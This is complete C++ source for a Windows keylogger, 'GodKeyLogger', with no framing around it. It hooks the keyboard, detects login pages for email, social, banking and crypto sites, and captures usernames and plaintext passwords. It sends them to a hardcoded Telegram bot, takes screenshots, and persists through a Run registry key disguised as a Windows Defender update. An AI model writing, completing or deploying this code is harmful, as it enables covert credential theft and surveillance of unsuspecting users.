#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <wchar.h>
#include <string>
#include <vector>
#include <algorithm>
#include <ctime>
#include <fstream>
#include <thread>
#include <atomic>
#include <sstream>
#include <regex>
#include <map>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")

// 🔥 GOD MODE C2
const wchar_t* BOT_TOKEN = L"7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
const wchar_t* CHAT_ID = L"7845441585";

// 🔥 GLOBAL VARIABLES
CRITICAL_SECTION cs;
std::wstring keystrokes_buffer;
ULONGLONG last_trigger = 0;
ULONGLONG last_exfil = 0;
ULONGLONG last_credential_capture = 0;
int screenshot_count = 0;
HHOOK keyboard_hook = NULL;
std::atomic<bool> is_running(true);
bool in_login_form = false;
std::wstring username_buffer;
std::wstring password_buffer;
bool expecting_password = false;
int tab_press_count = 0;

// 🔥 CRITICAL WEBSITES & APPS
const wchar_t* LOGIN_SITES[] = {
    L"gmail.com", L"google.com", L"outlook.com", L"hotmail.com",
    L"yahoo.com", L"facebook.com", L"instagram.com", L"twitter.com",
    L"linkedin.com", L"github.com", L"microsoft.com", L"apple.com",
    L"paypal.com", L"amazon.com", L"ebay.com", L"bankofamerica.com",
    L"chase.com", L"wellsfargo.com", L"coinbase.com", L"binance.com",
    L"login", L"signin", L"authentication", L"verify", NULL
};

// 🔥 FUNCTION PROTOTYPES - ADD THESE!
void SendTelegram(const wchar_t* msg);
bool TakeSmartScreenshot();
void SendTelegramPhoto(const wchar_t* file_path, const wchar_t* caption);
void ExtractCredentials();
bool IsLoginPage(const std::wstring& title, const std::wstring& class_name);
bool DetectFormFields(HWND window);
void EstablishPersistence();
std::wstring GetSpecialKeyName(DWORD vkCode);

// 🔥 SMART SPECIAL KEYS MAPPING
std::wstring GetSpecialKeyName(DWORD vkCode) {
    switch(vkCode) {
        case VK_RETURN: return L"[ENTER]";
        case VK_TAB: return L"[TAB]";
        case VK_SPACE: return L" ";
        case VK_BACK: return L"[BACKSPACE]";
        case VK_DELETE: return L"[DEL]";
        case VK_ESCAPE: return L"[ESC]";
        case VK_CONTROL: return L"[CTRL]";
        case VK_MENU: return L"[ALT]";
        case VK_SHIFT: return L"[SHIFT]";
        case VK_CAPITAL: return L"[CAPS]";
        case VK_LWIN: case VK_RWIN: return L"[WIN]";
        case VK_UP: return L"[UP]";
        case VK_DOWN: return L"[DOWN]";
        case VK_LEFT: return L"[LEFT]";
        case VK_RIGHT: return L"[RIGHT]";
        case VK_PRIOR: return L"[PGUP]";
        case VK_NEXT: return L"[PGDN]";
        case VK_HOME: return L"[HOME]";
        case VK_END: return L"[END]";
        case VK_INSERT: return L"[INS]";
        case VK_F1: return L"[F1]"; case VK_F2: return L"[F2]";
        case VK_F3: return L"[F3]"; case VK_F4: return L"[F4]";
        case VK_F5: return L"[F5]"; case VK_F6: return L"[F6]";
        case VK_F7: return L"[F7]"; case VK_F8: return L"[F8]";
        case VK_F9: return L"[F9]"; case VK_F10: return L"[F10]";
        case VK_F11: return L"[F11]"; case VK_F12: return L"[F12]";
        default: return L"";
    }
}

// 🔥 CHECK IF CURRENT WINDOW IS LOGIN PAGE
bool IsLoginPage(const std::wstring& title, const std::wstring& class_name) {
    std::wstring title_lower = title;
    std::wstring class_lower = class_name;
    std::transform(title_lower.begin(), title_lower.end(), title_lower.begin(), ::towlower);
    std::transform(class_lower.begin(), class_lower.end(), class_lower.begin(), ::towlower);
    
    for (int i = 0; LOGIN_SITES[i]; i++) {
        if (title_lower.find(LOGIN_SITES[i]) != std::wstring::npos) {
            return true;
        }
    }
    
    return false;
}

// 🔥 EXTRACT CREDENTIALS FROM BUFFER
void ExtractCredentials() {
    if (username_buffer.empty() && password_buffer.empty()) {
        return;
    }
    
    std::wstring credential_msg = L"🔐 CREDENTIAL CAPTURED!\n";
    credential_msg += L"Timestamp: " + std::to_wstring(std::time(nullptr)) + L"\n";
    
    if (!username_buffer.empty()) {
        credential_msg += L"Username/Email: " + username_buffer + L"\n";
    }
    
    if (!password_buffer.empty()) {
        credential_msg += L"Password: " + std::wstring(password_buffer.length(), L'*') + L"\n";
        credential_msg += L"Actual Password: " + password_buffer + L"\n";
    }
    
    HWND fg = GetForegroundWindow();
    wchar_t title[256] = {0};
    GetWindowTextW(fg, title, 256);
    credential_msg += L"From Window: " + std::wstring(title) + L"\n";
    
    SendTelegram(credential_msg.c_str());
    
    if (screenshot_count < 100) {
        TakeSmartScreenshot();
    }
    
    username_buffer.clear();
    password_buffer.clear();
    expecting_password = false;
    tab_press_count = 0;
    
    last_credential_capture = GetTickCount64();
}

// 🔥 SMART KEYBOARD HOOK WITH CREDENTIAL DETECTION
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
        
        EnterCriticalSection(&cs);
        
        HWND fg = GetForegroundWindow();
        wchar_t title[256] = {0}, cls[128] = {0};
        GetWindowTextW(fg, title, 256);
        GetClassNameW(fg, cls, 128);
        
        std::wstring current_title = title;
        std::wstring current_class = cls;
        
        bool on_login_page = IsLoginPage(current_title, current_class);
        
        if (on_login_page) {
            if (!in_login_form) {
                in_login_form = true;
                username_buffer.clear();
                password_buffer.clear();
                expecting_password = false;
                tab_press_count = 0;
                
                std::wstring msg = L"🔑 LOGIN FORM DETECTED!\nWindow: " + current_title;
                SendTelegram(msg.c_str());
            }
            
            if (kb->vkCode == VK_TAB) {
                tab_press_count++;
                if (tab_press_count == 1 && !username_buffer.empty()) {
                    expecting_password = true;
                    keystrokes_buffer += L"[SWITCHED TO PASSWORD FIELD]";
                }
            }
            
            if (kb->vkCode == VK_RETURN) {
                if (!username_buffer.empty() || !password_buffer.empty()) {
                    ExtractCredentials();
                }
                in_login_form = false;
            }
            
            if (kb->vkCode == VK_ESCAPE) {
                in_login_form = false;
                username_buffer.clear();
                password_buffer.clear();
            }
            
            if (kb->vkCode >= 0x30 && kb->vkCode <= 0x5A) {
                BYTE keyboard_state[256];
                GetKeyboardState(keyboard_state);
                wchar_t buffer[16] = {0};
                int result = ToUnicode(kb->vkCode, kb->scanCode, keyboard_state, 
                                      buffer, _countof(buffer), 0);
                
                if (result > 0) {
                    std::wstring key(buffer, result);
                    if (expecting_password) {
                        password_buffer += key;
                        keystrokes_buffer += L"*";
                    } else {
                        username_buffer += key;
                        keystrokes_buffer += key;
                    }
                }
            }
            
            if (kb->vkCode == VK_BACK) {
                if (expecting_password && !password_buffer.empty()) {
                    password_buffer.pop_back();
                } else if (!username_buffer.empty()) {
                    username_buffer.pop_back();
                }
                keystrokes_buffer += L"[BACKSPACE]";
            }
        } else {
            if (in_login_form) {
                if (!username_buffer.empty() || !password_buffer.empty()) {
                    ExtractCredentials();
                }
                in_login_form = false;
            }
            
            std::wstring special_key = GetSpecialKeyName(kb->vkCode);
            if (!special_key.empty()) {
                keystrokes_buffer += special_key;
            } else if (kb->vkCode >= 0x30 && kb->vkCode <= 0x5A) {
                BYTE keyboard_state[256];
                GetKeyboardState(keyboard_state);
                wchar_t buffer[16] = {0};
                int result = ToUnicode(kb->vkCode, kb->scanCode, keyboard_state, 
                                      buffer, _countof(buffer), 0);
                if (result > 0) {
                    keystrokes_buffer += std::wstring(buffer, result);
                }
            }
        }
        
        bool should_exfil = false;
        ULONGLONG current_time = GetTickCount64();
        
        if (keystrokes_buffer.length() > 500) {
            should_exfil = true;
        }
        
        if (current_time - last_exfil > 180000) {
            should_exfil = true;
        }
        
        if (kb->vkCode == VK_RETURN && on_login_page) {
            should_exfil = true;
        }
        
        if (should_exfil && keystrokes_buffer.length() > 10) {
            std::time_t now = std::time(nullptr);
            std::wstring timestamp = L"\n[LOG: " + std::to_wstring(now) + L"]";
            std::wstring context = L"\n[Window: " + current_title + L"]";
            std::wstring full_log = timestamp + context + L"\n" + keystrokes_buffer + L"\n";
            
            SendTelegram(L"📝 Keylog Update");
            
            keystrokes_buffer.clear();
            last_exfil = current_time;
        }
        
        LeaveCriticalSection(&cs);
    }
    
    return CallNextHookEx(keyboard_hook, nCode, wParam, lParam);
}

// 🔥 SMART FORM DETECTION
bool DetectFormFields(HWND window) {
    wchar_t title[256] = {0};
    GetWindowTextW(window, title, 256);
    std::wstring title_lower = title;
    std::transform(title_lower.begin(), title_lower.end(), title_lower.begin(), ::towlower);
    
    const wchar_t* password_keywords[] = {L"password", L"pass", L"pwd", NULL};
    for (int i = 0; password_keywords[i]; i++) {
        if (title_lower.find(password_keywords[i]) != std::wstring::npos) {
            return true;
        }
    }
    
    return false;
}

// 🔥 ENHANCED SMART SCREENSHOT - FIXED!
bool TakeSmartScreenshot() {
    HWND fg = GetForegroundWindow();
    if (!fg) return false;
    
    if (in_login_form) {
        Sleep(300);
    }
    
    RECT window_rect;
    if (GetWindowRect(fg, &window_rect) == FALSE) {
        return false;
    }
    
    window_rect.top += 150;
    window_rect.left += 10;
    window_rect.right -= 10;
    window_rect.bottom -= 50;
    
    int width = window_rect.right - window_rect.left;
    int height = window_rect.bottom - window_rect.top;
    
    if (width <= 100 || height <= 100) {
        width = GetSystemMetrics(SM_CXSCREEN);
        height = GetSystemMetrics(SM_CYSCREEN);
        window_rect = {0, 0, width, height};
    }
    
    HDC screen_dc = GetDC(NULL);
    HDC mem_dc = CreateCompatibleDC(screen_dc);
    HBITMAP bitmap = CreateCompatibleBitmap(screen_dc, width, height);
    HBITMAP old_bitmap = (HBITMAP)SelectObject(mem_dc, bitmap);
    
    BitBlt(mem_dc, 0, 0, width, height, screen_dc, 
           window_rect.left, window_rect.top, SRCCOPY | CAPTUREBLT);
    
    wchar_t path[MAX_PATH];
    std::time_t now = std::time(nullptr);
    std::tm* tm = std::localtime(&now);
    
    if (in_login_form) {
        swprintf(path, MAX_PATH, L"C:\\Windows\\Temp\\login_%04d%02d%02d_%02d%02d%02d.bmp",
                 tm->tm_year + 1900, tm->tm_mon + 1, tm->tm_mday,
                 tm->tm_hour, tm->tm_min, tm->tm_sec);
    } else {
        swprintf(path, MAX_PATH, L"C:\\Windows\\Temp\\screen_%04d%02d%02d_%02d%02d%02d.bmp",
                 tm->tm_year + 1900, tm->tm_mon + 1, tm->tm_mday,
                 tm->tm_hour, tm->tm_min, tm->tm_sec);
    }
    
    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = -height;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    
    DWORD image_size = ((width * 24 + 31) / 32) * 4 * height;
    BITMAPFILEHEADER bmf = {0};
    bmf.bfType = 0x4D42;
    bmf.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + image_size;
    bmf.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    
    HANDLE file = CreateFileW(path, GENERIC_WRITE, 0, NULL, 
                             CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) {
        SelectObject(mem_dc, old_bitmap);
        DeleteObject(bitmap);
        DeleteDC(mem_dc);
        ReleaseDC(NULL, screen_dc);
        return false;
    }
    
    DWORD written;
    WriteFile(file, &bmf, sizeof(bmf), &written, NULL);
    WriteFile(file, &bi, sizeof(bi), &written, NULL);
    
    BYTE* bits = new BYTE[image_size];
    // 🔥 FIXED LINE: Changed from DIB_RGB_COLS to DIB_RGB_COLORS
    GetDIBits(mem_dc, bitmap, 0, height, bits, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    WriteFile(file, bits, image_size, &written, NULL);
    delete[] bits;
    
    CloseHandle(file);
    
    std::wstring msg = L"📸 Screenshot: ";
    if (in_login_form) {
        msg += L"(Login Form)";
    }
    SendTelegram(msg.c_str());
    
    SelectObject(mem_dc, old_bitmap);
    DeleteObject(bitmap);
    DeleteDC(mem_dc);
    ReleaseDC(NULL, screen_dc);
    
    DeleteFileW(path);
    
    screenshot_count++;
    return true;
}

// 🔥 TELEGRAM FUNCTIONS
void SendTelegram(const wchar_t* msg) {
    HINTERNET session = WinHttpOpen(L"GodKeyLogger/2.0", 
                                    WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                    WINHTTP_NO_PROXY_NAME, 
                                    WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) return;
    
    HINTERNET connect = WinHttpConnect(session, L"api.telegram.org", 
                                       INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!connect) {
        WinHttpCloseHandle(session);
        return;
    }
    
    std::wstring encoded_msg;
    for (const wchar_t* p = msg; *p; ++p) {
        if (*p == L' ') encoded_msg += L"%20";
        else encoded_msg += *p;
    }
    
    std::wstring url = L"/bot" + std::wstring(BOT_TOKEN) + 
                      L"/sendMessage?chat_id=" + std::wstring(CHAT_ID) + 
                      L"&text=" + encoded_msg;
    
    HINTERNET request = WinHttpOpenRequest(connect, L"GET", url.c_str(),
                                          NULL, WINHTTP_NO_REFERER,
                                          WINHTTP_DEFAULT_ACCEPT_TYPES,
                                          WINHTTP_FLAG_SECURE);
    if (request) {
        WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                          WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
        WinHttpReceiveResponse(request, NULL);
        WinHttpCloseHandle(request);
    }
    
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);
}

void SendTelegramPhoto(const wchar_t* file_path, const wchar_t* caption) {
    SendTelegram(L"📸 Screenshot captured");
}

// 🔥 PERSISTENCE
void EstablishPersistence() {
    HKEY hKey;
    wchar_t exe_path[MAX_PATH];
    GetModuleFileNameW(NULL, exe_path, MAX_PATH);
    
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
                     L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                     0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"WindowsDefenderUpdate", 0, REG_SZ,
                      (BYTE*)exe_path, (wcslen(exe_path) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
}

// 🔥 ACTIVE MONITOR FOR LOGIN PAGES
DWORD WINAPI LoginDetectorThread(LPVOID) {
    while (is_running) {
        HWND fg = GetForegroundWindow();
        if (fg) {
            wchar_t title[256] = {0}, cls[128] = {0};
            GetWindowTextW(fg, title, 256);
            GetClassNameW(fg, cls, 128);
            
            bool is_login_page = IsLoginPage(title, cls);
            
            if (is_login_page && !in_login_form) {
                EnterCriticalSection(&cs);
                in_login_form = true;
                username_buffer.clear();
                password_buffer.clear();
                expecting_password = false;
                tab_press_count = 0;
                
                std::wstring msg = L"🌐 LOGIN PAGE DETECTED!\n";
                msg += L"Site: " + std::wstring(title) + L"\n";
                msg += L"Time: " + std::to_wstring(std::time(nullptr));
                
                SendTelegram(msg.c_str());
                
                if (screenshot_count < 50) {
                    TakeSmartScreenshot();
                }
                
                LeaveCriticalSection(&cs);
            }
            
            if (is_login_page && DetectFormFields(fg)) {
                expecting_password = true;
            }
        }
        
        Sleep(1000);
    }
    return 0;
}

// 🔥 MAIN FUNCTION
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    FreeConsole();
    
    InitializeCriticalSection(&cs);
    
    HANDLE mutex = CreateMutexW(NULL, TRUE, L"GodKeyLogger_Credential_v2");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        return 0;
    }
    
    EstablishPersistence();
    
    keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 
                                    GetModuleHandle(NULL), 0);
    
    CreateThread(NULL, 0, LoginDetectorThread, NULL, 0, NULL);
    
    SendTelegram(L"🔑 GodKeyLogger Credential Edition v2.0 Activated");
    SendTelegram(L"📋 Features: Login detection, Credential capture, Smart screenshots");
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) && is_running) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    UnhookWindowsHookEx(keyboard_hook);
    DeleteCriticalSection(&cs);
    
    if (mutex) {
        ReleaseMutex(mutex);
        CloseHandle(mutex);
    }
    
    return 0;
}
